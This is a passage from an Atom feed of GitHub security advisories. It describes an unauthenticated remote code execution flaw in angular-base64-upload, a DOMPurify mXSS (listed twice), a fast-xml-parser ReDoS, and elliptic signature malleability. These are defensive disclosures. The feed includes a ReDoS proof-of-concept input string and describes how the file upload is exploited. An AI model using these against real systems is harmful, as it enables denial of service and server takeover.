</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pppg-cpfq-h7wr</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-10-11T15:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[angular-base64-upload] angular-base64-upload vulnerable to unauthenticated remote code execution]]></title>
        <id>https://github.com/advisories/GHSA-vgxq-6rcf-qwrw</id>
        <link href="https://github.com/advisories/GHSA-vgxq-6rcf-qwrw"/>
        <updated>2024-10-11T19:44:07.000Z</updated>
        <content type="html"><![CDATA[<p>angular-base64-upload versions prior to v0.1.21 are vulnerable to unauthenticated remote code execution via the <code>angular-base64-upload/demo/server.php</code> endpoint. Exploitation of this vulnerability involves uploading arbitrary file content to the server, which can subsequently accessed through the <code>angular-base64-upload/demo/uploads</code> endpoint. This leads to the execution of previously uploaded content which enables the attacker to achieve code execution on the server.</p>
<p>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42640">https://nvd.nist.gov/vuln/detail/CVE-2024-42640</a></li>
<li><a href="https://github.com/adonespitogo/angular-base64-upload">https://github.com/adonespitogo/angular-base64-upload</a></li>
<li><a href="https://www.zyenra.com/blog/unauthenticated-rce-in-angular-base64-upload.html">https://www.zyenra.com/blog/unauthenticated-rce-in-angular-base64-upload.html</a></li>
<li><a href="https://github.com/rvizx/CVE-2024-42640">https://github.com/rvizx/CVE-2024-42640</a></li>
<li><a href="https://github.com/advisories/GHSA-vgxq-6rcf-qwrw">https://github.com/advisories/GHSA-vgxq-6rcf-qwrw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vgxq-6rcf-qwrw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-10-11T18:32:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMpurify has a nesting-based mXSS]]></title>
        <id>https://github.com/advisories/GHSA-gx9m-whjm-85jf</id>
        <link href="https://github.com/advisories/GHSA-gx9m-whjm-85jf"/>
        <updated>2024-10-11T17:27:30.000Z</updated>
        <content type="html"><![CDATA[<p>DOMpurify was vulnerable to nesting-based mXSS </p>
<p>fixed by <a href="https://github.com/cure53/DOMPurify/tree/0ef5e537a514f904b6aa1d7ad9e749e365d7185f">0ef5e537</a> (2.x) and
<a href="https://github.com/cure53/DOMPurify/pull/943">merge 943</a></p>
<p>Backporter should be aware of GHSA-mmhx-hmjr-r674 (CVE-2024-45801) when cherry-picking</p>
<p>POC is avaible under <a href="https://github.com/cure53/DOMPurify/blob/0ef5e537a514f904b6aa1d7ad9e749e365d7185f/test/test-suite.js#L2098">test</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-gx9m-whjm-85jf">https://github.com/cure53/DOMPurify/security/advisories/GHSA-gx9m-whjm-85jf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47875">https://nvd.nist.gov/vuln/detail/CVE-2024-47875</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/0ef5e537a514f904b6aa1d7ad9e749e365d7185f">https://github.com/cure53/DOMPurify/commit/0ef5e537a514f904b6aa1d7ad9e749e365d7185f</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/6ea80cd8b47640c20f2f230c7920b1f4ce4fdf7a">https://github.com/cure53/DOMPurify/commit/6ea80cd8b47640c20f2f230c7920b1f4ce4fdf7a</a></li>
<li><a href="https://github.com/cure53/DOMPurify/blob/0ef5e537a514f904b6aa1d7ad9e749e365d7185f/test/test-suite.js#L2098">https://github.com/cure53/DOMPurify/blob/0ef5e537a514f904b6aa1d7ad9e749e365d7185f/test/test-suite.js#L2098</a></li>
<li><a href="https://github.com/advisories/GHSA-gx9m-whjm-85jf">https://github.com/advisories/GHSA-gx9m-whjm-85jf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gx9m-whjm-85jf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-11T17:27:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMpurify has a nesting-based mXSS]]></title>
        <id>https://github.com/advisories/GHSA-gx9m-whjm-85jf</id>
        <link href="https://github.com/advisories/GHSA-gx9m-whjm-85jf"/>
        <updated>2024-10-11T17:27:30.000Z</updated>
        <content type="html"><![CDATA[<p>DOMpurify was vulnerable to nesting-based mXSS </p>
<p>fixed by <a href="https://github.com/cure53/DOMPurify/tree/0ef5e537a514f904b6aa1d7ad9e749e365d7185f">0ef5e537</a> (2.x) and
<a href="https://github.com/cure53/DOMPurify/pull/943">merge 943</a></p>
<p>Backporter should be aware of GHSA-mmhx-hmjr-r674 (CVE-2024-45801) when cherry-picking</p>
<p>POC is avaible under <a href="https://github.com/cure53/DOMPurify/blob/0ef5e537a514f904b6aa1d7ad9e749e365d7185f/test/test-suite.js#L2098">test</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-gx9m-whjm-85jf">https://github.com/cure53/DOMPurify/security/advisories/GHSA-gx9m-whjm-85jf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-47875">https://nvd.nist.gov/vuln/detail/CVE-2024-47875</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/0ef5e537a514f904b6aa1d7ad9e749e365d7185f">https://github.com/cure53/DOMPurify/commit/0ef5e537a514f904b6aa1d7ad9e749e365d7185f</a></li>
<li><a href="https://github.com/cure53/DOMPurify/commit/6ea80cd8b47640c20f2f230c7920b1f4ce4fdf7a">https://github.com/cure53/DOMPurify/commit/6ea80cd8b47640c20f2f230c7920b1f4ce4fdf7a</a></li>
<li><a href="https://github.com/cure53/DOMPurify/blob/0ef5e537a514f904b6aa1d7ad9e749e365d7185f/test/test-suite.js#L2098">https://github.com/cure53/DOMPurify/blob/0ef5e537a514f904b6aa1d7ad9e749e365d7185f/test/test-suite.js#L2098</a></li>
<li><a href="https://github.com/advisories/GHSA-gx9m-whjm-85jf">https://github.com/advisories/GHSA-gx9m-whjm-85jf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gx9m-whjm-85jf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-11T17:27:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-xml-parser] fast-xml-parser vulnerable to ReDOS at currency parsing]]></title>
        <id>https://github.com/advisories/GHSA-mpg4-rc92-vx8v</id>
        <link href="https://github.com/advisories/GHSA-mpg4-rc92-vx8v"/>
        <updated>2024-10-11T14:14:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A ReDOS that exists on currency.js was discovered by Gauss Security Labs R&amp;D team.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/NaturalIntelligence/fast-xml-parser/blob/v4.4.0/src/v5/valueParsers/currency.js#L10">https://github.com/NaturalIntelligence/fast-xml-parser/blob/v4.4.0/src/v5/valueParsers/currency.js#L10</a> contains a vulnerable regex </p>
<h3 id="poc">PoC</h3>
<p>pass the following string '\t'.repeat(13337)  + '.'</p>
<h3 id="impact">Impact</h3>
<p>Denial of service during currency parsing in experimental version 5 of fast-xml-parser-library</p>
<p><a href="https://gauss-security.com">https://gauss-security.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-mpg4-rc92-vx8v">https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-mpg4-rc92-vx8v</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/commit/d0bfe8a3a2813a185f39591bbef222212d856164">https://github.com/NaturalIntelligence/fast-xml-parser/commit/d0bfe8a3a2813a185f39591bbef222212d856164</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/blob/master/src/v5/valueParsers/currency.js#L10">https://github.com/NaturalIntelligence/fast-xml-parser/blob/master/src/v5/valueParsers/currency.js#L10</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41818">https://nvd.nist.gov/vuln/detail/CVE-2024-41818</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/commit/ba5f35e7680468acd7906eaabb2f69e28ed8b2aa">https://github.com/NaturalIntelligence/fast-xml-parser/commit/ba5f35e7680468acd7906eaabb2f69e28ed8b2aa</a></li>
<li><a href="https://github.com/advisories/GHSA-mpg4-rc92-vx8v">https://github.com/advisories/GHSA-mpg4-rc92-vx8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mpg4-rc92-vx8v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-29T17:46:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic's verify function omits uniqueness validation]]></title>
        <id>https://github.com/advisories/GHSA-434g-2637-qmqr</id>
        <link href="https://github.com/advisories/GHSA-434g-2637-qmqr"/>
        <updated>2024-10-15T17:14:02.000Z</updated>
        <content type="html"><![CDATA[<p>The Elliptic package 6.5.5 for Node.js for EDDSA implementation does not perform the required check if the signature proof(s) is within the bounds of the order n of the base point of the elliptic curve, leading to signature malleability. Namely, the <code>verify</code> function in <code>lib/elliptic/eddsa/index.js</code> omits <code>sig.S().gte(sig.eddsa.curve.n) || sig.S().isNeg()</code> validation.</p>
<p>This vulnerability could have a security-relevant impact if an application relies on the uniqueness of a signature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48949">https://nvd.nist.gov/vuln/detail/CVE-2024-48949</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/7ac5360118f74eb02da73bdf9f24fd0c72ff5281">https://github.com/indutny/elliptic/commit/7ac5360118f74eb02da73bdf9f24fd0c72ff5281</a></li>
<li><a href="https://github.com/indutny/elliptic/compare/v6.5.5...v6.5.6">https://github.com/indutny/elliptic/compare/v6.5.5...v6.5.6</a></li>
<li><a href="https://github.com/advisories/GHSA-434g-2637-qmqr">https://github.com/advisories/GHSA-434g-2637-qmqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-434g-2637-qmqr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-10T03:30:44.000Z</published>
    </entry>
</feed>